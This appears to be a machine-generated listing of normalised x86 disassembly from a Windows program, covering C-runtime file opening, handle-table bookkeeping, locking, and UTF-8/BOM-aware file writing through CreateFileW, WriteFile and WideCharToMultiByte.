mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_4504e8
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_443b4a
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_443b37
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_443b37
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_443b5d
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_443b5d
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_443b37
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_4502a3
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_44440f
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
mov [ ebp - 0x24 ] ebx
call sub_444aa4
add esp 0xc
test eax eax
jne r-xdata
call sub_443b4a
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_44440f
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
push [ esi ]
call sub_445163
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_443b5d
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_450324
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_4545f4
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_444aa4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_450fbc
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_450fbc
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_445163
pop ecx
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_44440f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_450db5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_44440f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_450fbc
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_450fbc
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_44ffda
push 0x14
push r--data
call sub_4433dc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_443b37
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_443421
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_44f8ba
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_450078
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_450078
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_4504c1
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_4500a6
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_44ffda
add esp 0x18
pop ebp
retn
sub_4500c6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_45010c
push 0x10
push r--data
call sub_4433dc
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_443421
retn
sub_45016c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45018c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_43f96b
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_4501d1
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4501d1
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_45018c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_450281
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4502a0
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_450278
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_450281
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4502a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_450324
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4503aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_443b4a
mov [ eax ] esi
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_450421
push 0xc
push r--data
call sub_4433dc
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_443421
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4504b8
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_45010c
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_4504c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4504e8
push 0x18
push r--data
call sub_4433dc
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_448823
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_450679
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_443421
retn
push 0x40
push 0x20
call sub_445f7b
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_450421
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_4488e6
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4505bb
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_45010c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_450682
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_44f7f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_443b4a
mov [ eax ] esi
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_43f96b
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_443b4a
xor esi esi
mov [ eax ] esi
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_451499
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_450fbc
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_445601
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_443b37
mov [ eax ] 0x1c
call sub_443b4a
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_443b5d
pop ecx
jmp r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_44d97b
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
